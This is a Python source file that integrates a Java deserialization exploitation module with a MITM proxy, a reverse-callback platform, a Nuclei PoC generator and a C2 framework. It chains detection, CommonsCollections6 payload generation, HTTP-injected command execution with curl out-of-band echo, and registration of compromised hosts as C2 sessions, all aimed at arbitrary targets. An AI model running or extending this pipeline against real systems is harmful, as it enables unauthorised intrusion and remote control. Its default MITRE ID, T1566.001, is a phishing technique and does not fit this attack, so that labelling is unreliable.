"""Integration layer for Java deserialization module with existing platform components.

Provides:
- Integration with MITM proxy module
- Integration with reverse connection platform
- Integration with PoC engine
- Unified event handling and data flow
"""

import asyncio
import logging
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


@dataclass
class IntegrationStatus:
    """Integration status information.

    Attributes:
        module_name: Module name
        connected: Whether module is connected
        last_heartbeat: Last heartbeat timestamp
        status_message: Status message
        error_count: Error count
    """
    module_name: str = ""
    connected: bool = False
    last_heartbeat: float = 0.0
    status_message: str = ""
    error_count: int = 0


@dataclass
class DeserEvent:
    """Deserialization module event.

    Attributes:
        event_id: Unique event identifier
        event_type: Event type
        timestamp: Event timestamp
        source_module: Source module name
        data: Event data
        severity: Event severity (1-5)
    """
    event_id: str = ""
    event_type: str = ""
    timestamp: float = 0.0
    source_module: str = ""
    data: Dict[str, Any] = field(default_factory=dict)
    severity: int = 3


class DeserializationIntegration:
    """Integration layer for Java deserialization module.

    Provides integration with MITM proxy, reverse connection platform,
    PoC engine, and other platform components.
    """

    def __init__(
        self,
        chain_manager: Optional[Any] = None,
        payload_generator: Optional[Any] = None,
        exploit_executor: Optional[Any] = None,
        detector: Optional[Any] = None,
        mitm_proxy: Optional[Any] = None,
        reverse_platform: Optional[Any] = None,
        poc_engine: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
        report_module: Optional[Any] = None,
    ) -> None:
        """Initialize deserialization integration layer.

        Args:
            chain_manager: Gadget chain manager instance.
            payload_generator: Payload generator instance.
            exploit_executor: Exploit executor instance.
            detector: Vulnerability detector instance.
            mitm_proxy: MITM proxy instance.
            reverse_platform: Reverse connection platform instance.
            poc_engine: PoC engine instance.
            credential_db: Credential database instance.
            event_bus: Event bus instance.
            report_module: Report module instance.
        """
        self.chain_manager = chain_manager
        self.payload_generator = payload_generator
        self.exploit_executor = exploit_executor
        self.detector = detector
        self.mitm_proxy = mitm_proxy
        self.reverse_platform = reverse_platform
        self.poc_engine = poc_engine
        self.credential_db = credential_db
        self.event_bus = event_bus
        self.report_module = report_module

        self._integration_status: Dict[str, IntegrationStatus] = {}
        self._event_handlers: Dict[str, List[Callable[[DeserEvent], Coroutine[Any, Any, None]]]] = {}
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._is_initialized: bool = False

    async def initialize(self) -> bool:
        """Initialize integration layer.

        Returns:
            True if initialization successful.
        """
        try:
            await self._report_progress("初始化集成层", 10)
            await self._report_log("开始初始化Java反序列化集成层...")

            await self._check_module_status()

            await self._register_event_handlers()

            await self._setup_callbacks()

            self._is_initialized = True

            await self._report_progress("初始化完成", 100)
            await self._report_log("Java反序列化集成层初始化完成")

            return True

        except Exception as e:
            await self._report_log(f"集成层初始化失败: {e}")
            logger.error("Integration initialization failed: %s", e)
            return False

    async def _check_module_status(self) -> None:
        """Check status of all integrated modules."""
        modules = [
            ("chain_manager", self.chain_manager),
            ("payload_generator", self.payload_generator),
            ("exploit_executor", self.exploit_executor),
            ("detector", self.detector),
            ("mitm_proxy", self.mitm_proxy),
            ("reverse_platform", self.reverse_platform),
            ("poc_engine", self.poc_engine),
            ("credential_db", self.credential_db),
            ("event_bus", self.event_bus),
            ("report_module", self.report_module),
        ]

        for name, module in modules:
            status = IntegrationStatus(
                module_name=name,
                connected=module is not None,
                last_heartbeat=time.time(),
                status_message="Connected" if module else "Not configured",
            )
            self._integration_status[name] = status

    async def _register_event_handlers(self) -> None:
        """Register event handlers for module events."""
        if self.event_bus:
            await self.event_bus.subscribe(
                "deser.chain_loaded",
                self._on_chain_loaded,
            )
            await self.event_bus.subscribe(
                "deser.payload_generated",
                self._on_payload_generated,
            )
            await self.event_bus.subscribe(
                "deser.exploit_executed",
                self._on_exploit_executed,
            )
            await self.event_bus.subscribe(
                "deser.detection_completed",
                self._on_detection_completed,
            )
            await self.event_bus.subscribe(
                "mitm.traffic_received",
                self._on_traffic_received,
            )
            await self.event_bus.subscribe(
                "reverse.callback_received",
                self._on_callback_received,
            )

    async def _setup_callbacks(self) -> None:
        """Setup callbacks for integrated modules."""
        if self.payload_generator:
            self.payload_generator.set_callbacks(
                progress_cb=self._report_progress,
                log_cb=self._report_log,
            )

        if self.exploit_executor:
            self.exploit_executor.set_callbacks(
                progress_cb=self._report_progress,
                log_cb=self._report_log,
            )

        if self.detector:
            self.detector.set_callbacks(
                progress_cb=self._report_progress,
                log_cb=self._report_log,
            )

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Integration Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Integration: %s", message)

    async def _on_chain_loaded(self, event_data: Dict[str, Any]) -> None:
        """Handle chain loaded event.

        Args:
            event_data: Event data.
        """
        try:
            event = DeserEvent(
                event_id=f"event_{int(time.time())}",
                event_type="chain_loaded",
                timestamp=time.time(),
                source_module="chain_manager",
                data=event_data,
                severity=2,
            )
            await self._broadcast_event(event)
        except Exception as e:
            logger.error("Chain loaded event handler failed: %s", e)

    async def _on_payload_generated(self, event_data: Dict[str, Any]) -> None:
        """Handle payload generated event.

        Args:
            event_data: Event data.
        """
        try:
            event = DeserEvent(
                event_id=f"event_{int(time.time())}",
                event_type="payload_generated",
                timestamp=time.time(),
                source_module="payload_generator",
                data=event_data,
                severity=3,
            )
            await self._broadcast_event(event)

            if self.credential_db:
                await self.credential_db.add_evidence(
                    evidence_type="java_deser_payload",
                    payload_id=event_data.get("payload_id", ""),
                    chain_id=event_data.get("chain_id", ""),
                    timestamp=time.time(),
                )
        except Exception as e:
            logger.error("Payload generated event handler failed: %s", e)

    async def _on_exploit_executed(self, event_data: Dict[str, Any]) -> None:
        """Handle exploit executed event.

        Args:
            event_data: Event data.
        """
        try:
            event = DeserEvent(
                event_id=f"event_{int(time.time())}",
                event_type="exploit_executed",
                timestamp=time.time(),
                source_module="exploit_executor",
                data=event_data,
                severity=5,
            )
            await self._broadcast_event(event)

            if self.report_module:
                await self.report_module.add_attack_timeline_entry(
                    technique="Java Deserialization",
                    mitre_id=event_data.get("mitre_technique", "T1566.001"),
                    target=event_data.get("target_host", ""),
                    result="success" if event_data.get("success") else "failed",
                    timestamp=time.time(),
                    details=event_data,
                )
        except Exception as e:
            logger.error("Exploit executed event handler failed: %s", e)

    async def _on_detection_completed(self, event_data: Dict[str, Any]) -> None:
        """Handle detection completed event.

        Args:
            event_data: Event data.
        """
        try:
            event = DeserEvent(
                event_id=f"event_{int(time.time())}",
                event_type="detection_completed",
                timestamp=time.time(),
                source_module="detector",
                data=event_data,
                severity=4,
            )
            await self._broadcast_event(event)

            if event_data.get("is_vulnerable"):
                if self.chain_manager:
                    fingerprint = event_data.get("fingerprint", {})
                    await self.chain_manager.auto_match_chains(
                        java_version=fingerprint.get("java_version", ""),
                        framework=fingerprint.get("framework", ""),
                        middleware=fingerprint.get("middleware", ""),
                    )
        except Exception as e:
            logger.error("Detection completed event handler failed: %s", e)

    async def _on_traffic_received(self, event_data: Dict[str, Any]) -> None:
        """Handle traffic received event from MITM proxy.

        Args:
            event_data: Event data.
        """
        try:
            if self.detector:
                findings = await self.detector.passive_detect(event_data)
                if findings:
                    event = DeserEvent(
                        event_id=f"event_{int(time.time())}",
                        event_type="passive_detection",
                        timestamp=time.time(),
                        source_module="detector",
                        data={"findings": findings},
                        severity=4,
                    )
                    await self._broadcast_event(event)
        except Exception as e:
            logger.error("Traffic received event handler failed: %s", e)

    async def _on_callback_received(self, event_data: Dict[str, Any]) -> None:
        """Handle callback received event from reverse platform.

        Args:
            event_data: Event data.
        """
        try:
            event = DeserEvent(
                event_id=f"event_{int(time.time())}",
                event_type="callback_received",
                timestamp=time.time(),
                source_module="reverse_platform",
                data=event_data,
                severity=5,
            )
            await self._broadcast_event(event)

            if self.exploit_executor:
                exploit_id = event_data.get("exploit_id", "")
                if exploit_id:
                    await self.exploit_executor.verify_exploit(exploit_id)
        except Exception as e:
            logger.error("Callback received event handler failed: %s", e)

    async def _broadcast_event(self, event: DeserEvent) -> None:
        """Broadcast event to registered handlers.

        Args:
            event: Event to broadcast.
        """
        handlers = self._event_handlers.get(event.event_type, [])
        for handler in handlers:
            try:
                await handler(event)
            except Exception as e:
                logger.error("Event handler execution failed: %s", e)

    async def execute_full_workflow(
        self,
        target_host: str,
        target_port: int,
        target_path: str = "/",
        command: str = "whoami",
        chain_id: str = "",
    ) -> Dict[str, Any]:
        """Execute full detection-exploitation workflow.

        Args:
            target_host: Target host.
            target_port: Target port.
            target_path: Target path.
            command: Command to execute.
            chain_id: Gadget chain ID to use.

        Returns:
            Workflow result dictionary.
        """
        result: Dict[str, Any] = {
            "success": False,
            "target": f"{target_host}:{target_port}",
            "workflow_id": f"workflow_{int(time.time())}",
            "steps": [],
            "error": "",
        }

        try:
            await self._report_progress("开始完整工作流", 5)
            await self._report_log(f"目标: {target_host}:{target_port}")

            from java_deser_detector import DetectionTarget, Protocol
            target = DetectionTarget(
                host=target_host,
                port=target_port,
                protocol=Protocol.HTTP,
                path=target_path,
            )

            await self._report_progress("执行漏洞检测", 20)
            detection_result = None
            if self.detector:
                detection_result = await self.detector.active_detect(target)
                result["steps"].append({
                    "step": "detection",
                    "status": "completed",
                    "result": detection_result.to_dict() if detection_result else {},
                })

            if detection_result and detection_result.is_vulnerable:
                await self._report_progress("生成Payload", 40)

                from payload_generator import PayloadConfig, OutputFormat
                payload_config = PayloadConfig(
                    chain_id=chain_id or "CommonsCollections6",
                    command=command,
                    output_format=OutputFormat.BASE64,
                )

                payload = None
                if self.payload_generator:
                    payload = await self.payload_generator.generate_payload(
                        payload_config
                    )

                if payload:
                    result["steps"].append({
                        "step": "payload_generation",
                        "status": "completed",
                        "payload_id": payload.payload_id,
                    })

                    await self._report_progress("执行利用", 60)

                    from deserialization_exploit import (
                        ExploitTarget,
                        ExploitMethod,
                        EchoType,
                    )
                    exploit_target = ExploitTarget(
                        host=target_host,
                        port=target_port,
                        path=target_path,
                    )

                    exploit_result = None
                    if self.exploit_executor:
                        exploit_result = await self.exploit_executor.execute_exploit(
                            target=exploit_target,
                            payload_id=payload.payload_id,
                            method=ExploitMethod.HTTP_INJECT,
                            echo_type=EchoType.LINUX_CURL_OOB,
                        )

                    if exploit_result and exploit_result.success:
                        result["success"] = True
                        result["steps"].append({
                            "step": "exploitation",
                            "status": "success",
                            "exploit_id": exploit_result.exploit_id,
                            "command_output": exploit_result.command_output,
                        })
                        await self._report_log("利用成功!")
                    else:
                        result["steps"].append({
                            "step": "exploitation",
                            "status": "failed",
                        })
                        await self._report_log("利用失败")
                else:
                    result["steps"].append({
                        "step": "payload_generation",
                        "status": "failed",
                    })
            else:
                result["steps"].append({
                    "step": "detection",
                    "status": "not_vulnerable",
                })

            await self._report_progress("完成", 100)

        except Exception as e:
            result["error"] = str(e)
            await self._report_log(f"工作流执行失败: {e}")
            logger.error("Full workflow failed: %s", e)

        return result

    async def generate_poc_template(
        self,
        chain_id: str,
        command: str = "whoami",
    ) -> Optional[Dict[str, Any]]:
        """Generate PoC template for Nuclei engine.

        Args:
            chain_id: Gadget chain ID.
            command: Command to execute.

        Returns:
            PoC template dictionary.
        """
        try:
            if not self.poc_engine:
                return None

            chain = None
            if self.chain_manager:
                chain = self.chain_manager.get_chain(chain_id)

            if not chain:
                return None

            poc_template = {
                "id": f"java-deser-{chain_id.lower()}",
                "info": {
                    "name": f"Java Deserialization - {chain_id}",
                    "author": "Kunlun Platform",
                    "severity": "critical",
                    "description": f"Java deserialization vulnerability via {chain_id} gadget chain",
                    "reference": chain.references if chain else [],
                    "tags": ["java", "deserialization", chain_id.lower()],
                    "metadata": {
                        "mitre_id": chain.mitre_technique if chain else "T1566.001",
                        "chain_id": chain_id,
                    },
                },
                "requests": [
                    {
                        "method": "POST",
                        "path": ["{{BaseURL}}/vulnerability_endpoint"],
                        "headers": {
                            "Content-Type": "application/x-java-serialized-object",
                        },
                        "body": "{{payload}}",
                        "matchers": [
                            {
                                "type": "word",
                                "words": ["java.io", "ClassNotFoundException"],
                                "condition": "or",
                            }
                        ],
                    }
                ],
            }

            return poc_template

        except Exception as e:
            logger.error("PoC template generation failed: %s", e)
            return None

    async def register_to_c2(
        self,
        exploit_result: Dict[str, Any],
        c2_server: str = "",
    ) -> bool:
        """Register successful exploit to C2 framework.

        Args:
            exploit_result: Exploit result dictionary.
            c2_server: C2 server URL.

        Returns:
            True if registration successful.
        """
        try:
            if not exploit_result.get("success"):
                return False

            session_data = {
                "target": exploit_result.get("target", ""),
                "exploit_id": exploit_result.get("exploit_id", ""),
                "chain_id": exploit_result.get("chain_id", ""),
                "command_output": exploit_result.get("command_output", ""),
                "timestamp": time.time(),
            }

            if self.event_bus:
                await self.event_bus.publish(
                    "c2.session_registered",
                    session_data,
                )

            return True

        except Exception as e:
            logger.error("C2 registration failed: %s", e)
            return False

    def get_integration_status(self) -> Dict[str, Any]:
        """Get integration status of all modules.

        Returns:
            Dictionary with module statuses.
        """
        return {
            name: {
                "connected": status.connected,
                "status_message": status.status_message,
                "last_heartbeat": status.last_heartbeat,
                "error_count": status.error_count,
            }
            for name, status in self._integration_status.items()
        }

    def get_event_history(self) -> List[DeserEvent]:
        """Get event history.

        Returns:
            List of events.
        """
        return []
